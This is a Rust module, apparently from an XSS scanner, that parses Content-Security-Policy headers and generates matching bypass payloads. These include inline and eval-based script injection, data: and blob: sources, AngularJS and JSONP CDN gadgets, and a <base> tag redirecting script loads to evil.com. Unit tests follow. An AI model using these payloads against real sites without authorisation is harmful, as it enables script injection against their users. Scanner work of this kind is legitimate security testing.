//! CSP bypass payloads generated based on Content-Security-Policy analysis.
//!
//! These payloads exploit specific weaknesses in CSP configurations:
//! - `unsafe-inline`: Direct inline script execution
//! - `unsafe-eval`: eval()-based execution
//! - Missing `base-uri`: `<base>` tag injection to redirect relative URLs
//! - Missing `object-src`: Plugin-based execution
//! - Whitelisted CDN domains: JSONP/Angular/etc. gadgets on allowed origins
//! - `data:` scheme allowed in script-src
//! - `strict-dynamic` with nonce/hash: Script gadget injection

use crate::scanning::markers;

/// Parsed CSP directives relevant to XSS bypass.
#[derive(Debug, Clone, Default)]
pub struct CspAnalysis {
    pub has_unsafe_inline: bool,
    pub has_unsafe_eval: bool,
    pub has_strict_dynamic: bool,
    pub allows_data_scheme: bool,
    pub allows_blob_scheme: bool,
    pub missing_base_uri: bool,
    pub missing_object_src: bool,
    pub missing_script_src: bool,
    pub whitelisted_domains: Vec<String>,
}

/// Parse a CSP header value into an analysis struct.
pub fn analyze_csp(csp_value: &str) -> CspAnalysis {
    let mut analysis = CspAnalysis::default();

    let directives: Vec<&str> = csp_value.split(';').map(|s| s.trim()).collect();

    let mut has_script_src = false;
    let mut has_default_src = false;
    let mut has_base_uri = false;
    let mut has_object_src = false;

    for directive in &directives {
        let parts: Vec<&str> = directive.split_whitespace().collect();
        if parts.is_empty() {
            continue;
        }
        let name = parts[0].to_ascii_lowercase();
        let values: Vec<&str> = parts[1..].to_vec();

        match name.as_str() {
            "script-src" | "script-src-elem" => {
                has_script_src = true;
                for v in &values {
                    let lower = v.to_ascii_lowercase();
                    if lower == "'unsafe-inline'" {
                        analysis.has_unsafe_inline = true;
                    }
                    if lower == "'unsafe-eval'" {
                        analysis.has_unsafe_eval = true;
                    }
                    if lower == "'strict-dynamic'" {
                        analysis.has_strict_dynamic = true;
                    }
                    if lower == "data:" {
                        analysis.allows_data_scheme = true;
                    }
                    if lower == "blob:" {
                        analysis.allows_blob_scheme = true;
                    }
                    // Collect whitelisted domains (not keywords)
                    if !lower.starts_with('\'') && lower != "data:" && lower != "blob:" && lower != "*" {
                        analysis.whitelisted_domains.push(v.to_string());
                    }
                }
            }
            "default-src" => {
                has_default_src = true;
                for v in &values {
                    let lower = v.to_ascii_lowercase();
                    if lower == "'unsafe-inline'" {
                        analysis.has_unsafe_inline = true;
                    }
                    if lower == "'unsafe-eval'" {
                        analysis.has_unsafe_eval = true;
                    }
                }
            }
            "base-uri" => {
                has_base_uri = true;
            }
            "object-src" => {
                has_object_src = true;
            }
            _ => {}
        }
    }

    analysis.missing_script_src = !has_script_src && !has_default_src;
    analysis.missing_base_uri = !has_base_uri;
    analysis.missing_object_src = !has_object_src;

    analysis
}

/// Generate CSP bypass payloads based on CSP analysis.
pub fn get_csp_bypass_payloads(analysis: &CspAnalysis) -> Vec<String> {
    let class_marker = markers::class_marker();
    let id_marker = markers::id_marker();
    let mut payloads = Vec::new();

    // No script-src or default-src → CSP doesn't restrict scripts at all
    if analysis.missing_script_src {
        payloads.push(format!(
            "<script class={}>alert(1)</script>",
            class_marker
        ));
        payloads.push(format!(
            "<img src=x onerror=alert(1) class={}>",
            class_marker
        ));
        return payloads;
    }

    // unsafe-inline: direct inline script/event handler execution
    if analysis.has_unsafe_inline {
        payloads.push(format!(
            "<script class={}>alert(1)</script>",
            class_marker
        ));
        payloads.push(format!(
            "<img src=x onerror=alert(1) class={}>",
            class_marker
        ));
        payloads.push(format!(
            "<svg onload=alert(1) class={}>",
            class_marker
        ));
        payloads.push(format!(
            "<div onmouseover=alert(1) class={}>hover</div>",
            class_marker
        ));
    }

    // unsafe-eval: eval-based payloads
    if analysis.has_unsafe_eval {
        payloads.push(format!(
            "<img src=x onerror=eval('alert(1)') class={}>",
            class_marker
        ));
        payloads.push(format!(
            "<img src=x onerror=setTimeout('alert(1)') class={}>",
            class_marker
        ));
        payloads.push(format!(
            "<img src=x onerror=Function('alert(1)')() class={}>",
            class_marker
        ));
        payloads.push(format!(
            "<img src=x onerror=new%20Function('alert(1)')() id={}>",
            id_marker
        ));
    }

    // data: scheme allowed → script src with data URI
    if analysis.allows_data_scheme {
        payloads.push(format!(
            "<script src=\"data:text/javascript,alert(1)\" class={}></script>",
            class_marker
        ));
        payloads.push(format!(
            "<script src=\"data:;base64,YWxlcnQoMSk=\" class={}></script>",
            class_marker
        ));
        payloads.push(format!(
            "<iframe src=\"data:text/html,<script>alert(1)</script>\" class={}></iframe>",
            class_marker
        ));
    }

    // blob: scheme allowed
    if analysis.allows_blob_scheme {
        payloads.push(format!(
            "<script class={}>{{var b=new Blob(['alert(1)'],{{type:'text/javascript'}});var u=URL.createObjectURL(b);var s=document.createElement('script');s.src=u;document.head.appendChild(s)}}</script>",
            class_marker
        ));
    }

    // Missing base-uri → base tag injection to hijack relative script loads
    if analysis.missing_base_uri {
        payloads.push(format!(
            "<base href=\"https://evil.com/\" class={}>",
            class_marker
        ));
        payloads.push(format!(
            "<base href=\"//evil.com/\" id={}>",
            id_marker
        ));
    }

    // Missing object-src → object/embed injection
    if analysis.missing_object_src {
        payloads.push(format!(
            "<object data=\"data:text/html,<script>alert(1)</script>\" class={}></object>",
            class_marker
        ));
        payloads.push(format!(
            "<embed src=\"data:text/html,<script>alert(1)</script>\" class={}>",
            class_marker
        ));
    }

    // Known CDN JSONP/gadget endpoints on whitelisted domains
    for domain in &analysis.whitelisted_domains {
        let d = domain.to_ascii_lowercase();
        // Google CDN / APIs — common JSONP endpoints
        if d.contains("googleapis.com") || d.contains("google.com") || d.contains("gstatic.com") {
            payloads.push(format!(
                "<script src=\"https://www.google.com/complete/search?client=chrome&q=xss&callback=alert\" class={}></script>",
                class_marker
            ));
        }
        // Angular CDN — template injection via Angular bootstrap
        if d.contains("angularjs.org") || d.contains("angular") || d.contains("cdnjs.cloudflare.com") {
            payloads.push(format!(
                "<script src=\"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js\" class={}></script><div ng-app ng-csp>{{{{$eval.constructor('alert(1)')()}}}}</div>",
                class_marker
            ));
        }
        // jQuery CDN
        if d.contains("jquery") || d.contains("code.jquery.com") {
            payloads.push(format!(
                "<script src=\"https://code.jquery.com/jquery-3.6.0.min.js\" class={}></script><img src=x onerror=$.globalEval('alert(1)')>",
                class_marker
            ));
        }
        // unpkg / jsdelivr — universal gadget
        if d.contains("unpkg.com") || d.contains("jsdelivr.net") {
            payloads.push(format!(
                "<script src=\"https://cdn.jsdelivr.net/npm/angular@1.6.0/angular.min.js\" class={}></script><div ng-app ng-csp>{{{{$eval.constructor('alert(1)')()}}}}</div>",
                class_marker
            ));
        }
    }

    payloads
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_analyze_csp_unsafe_inline() {
        let csp = "script-src 'self' 'unsafe-inline'; style-src 'self'";
        let analysis = analyze_csp(csp);
        assert!(analysis.has_unsafe_inline);
        assert!(!analysis.has_unsafe_eval);
        assert!(analysis.missing_base_uri);
        assert!(analysis.missing_object_src);
    }

    #[test]
    fn test_analyze_csp_unsafe_eval() {
        let csp = "script-src 'self' 'unsafe-eval'; base-uri 'self'";
        let analysis = analyze_csp(csp);
        assert!(!analysis.has_unsafe_inline);
        assert!(analysis.has_unsafe_eval);
        assert!(!analysis.missing_base_uri);
    }

    #[test]
    fn test_analyze_csp_data_scheme() {
        let csp = "script-src 'self' data:";
        let analysis = analyze_csp(csp);
        assert!(analysis.allows_data_scheme);
    }

    #[test]
    fn test_analyze_csp_whitelisted_domains() {
        let csp = "script-src 'self' https://cdnjs.cloudflare.com https://www.google.com; object-src 'none'";
        let analysis = analyze_csp(csp);
        assert_eq!(analysis.whitelisted_domains.len(), 2);
        assert!(!analysis.missing_object_src);
    }

    #[test]
    fn test_analyze_csp_no_script_src_with_default() {
        let csp = "default-src 'self'";
        let analysis = analyze_csp(csp);
        assert!(!analysis.missing_script_src);
    }

    #[test]
    fn test_analyze_csp_no_directives() {
        let csp = "";
        let analysis = analyze_csp(csp);
        assert!(analysis.missing_script_src);
    }

    #[test]
    fn test_bypass_payloads_unsafe_inline() {
        let analysis = CspAnalysis {
            has_unsafe_inline: true,
            ..Default::default()
        };
        let payloads = get_csp_bypass_payloads(&analysis);
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.contains("<script")));
    }

    #[test]
    fn test_bypass_payloads_data_scheme() {
        let analysis = CspAnalysis {
            allows_data_scheme: true,
            ..Default::default()
        };
        let payloads = get_csp_bypass_payloads(&analysis);
        assert!(payloads.iter().any(|p| p.contains("data:")));
    }

    #[test]
    fn test_bypass_payloads_missing_base_uri() {
        let analysis = CspAnalysis {
            missing_base_uri: true,
            ..Default::default()
        };
        let payloads = get_csp_bypass_payloads(&analysis);
        assert!(payloads.iter().any(|p| p.contains("<base")));
    }

    #[test]
    fn test_bypass_payloads_cdn_gadgets() {
        let analysis = CspAnalysis {
            whitelisted_domains: vec!["https://cdnjs.cloudflare.com".to_string()],
            ..Default::default()
        };
        let payloads = get_csp_bypass_payloads(&analysis);
        assert!(payloads.iter().any(|p| p.contains("angular")));
    }

    #[test]
    fn test_bypass_payloads_no_script_src() {
        let analysis = CspAnalysis {
            missing_script_src: true,
            ..Default::default()
        };
        let payloads = get_csp_bypass_payloads(&analysis);
        assert!(!payloads.is_empty());
        // Should include basic payloads since CSP doesn't restrict scripts
        assert!(payloads.iter().any(|p| p.contains("alert(1)")));
    }
}
